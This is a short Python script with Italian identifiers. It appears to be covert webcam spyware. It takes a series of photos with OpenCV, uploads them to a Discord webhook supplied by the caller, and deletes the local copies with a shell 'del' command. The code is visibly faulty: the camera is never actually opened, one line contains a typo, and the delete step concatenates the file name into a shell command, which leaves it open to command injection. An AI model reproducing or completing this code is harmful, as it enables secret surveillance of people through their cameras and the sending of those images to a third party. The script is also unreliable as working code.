import cv2
import os
from discord_webhook import DiscordEmbed, DiscordWebhook
from time import sleep as d
def snap(numero_foto,nomefile,url_discord):
    a=0
    while a==10:
        camera = cv2.VideoCapture(a)
        a=+a
    i = 0
    while i < numero_foto:
        return_value, image = camera.read()
        cv2.imwrite(nomefile+str(i)+'.png', image)
        d(0.10)
        i += 1
    del(camera)
    ds=DiscordWebhook(url=url_discord)
    i = 0
    while i < numero_foto:
        with open(nomefile+str(i)+".png", "rb") as f:
            ds.add_file(file=f.read(), filename=str(i))
            ds.execute()
            os.system("del "+nomefile+str(i)+".png")